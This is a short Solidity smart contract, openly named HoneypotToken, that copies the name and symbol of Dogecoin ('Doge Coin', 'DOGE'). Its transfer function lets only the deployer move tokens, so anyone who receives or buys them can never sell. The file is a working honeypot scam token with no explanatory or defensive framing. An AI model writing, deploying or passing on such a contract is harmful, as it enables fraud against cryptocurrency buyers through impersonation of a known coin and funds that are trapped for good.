// SPDX-License-Identifier: MIT  
pragma solidity ^0.8.0;  

contract HoneypotToken {  
    string public name = "Doge Coin";  
    string public symbol = "DOGE";  
    uint8 public decimals = 18;  
    uint256 public totalSupply = 1000000 * 10**18;  

    mapping(address => uint256) private _balances;  
    address private _owner;  

    constructor() {  
        _owner = msg.sender;  
        _balances[_owner] = totalSupply;  
    }  

    //   
    function transfer(address to, uint256 amount) public returns (bool) {  
        require(msg.sender == _owner, "Transfer not allowed");  
        _balances[msg.sender] -= amount;  
        _balances[to] += amount;  
        return true;  
    }  

    //  
    function balanceOf(address account) public view returns (uint256) {  
        return _balances[account];  
    }  
}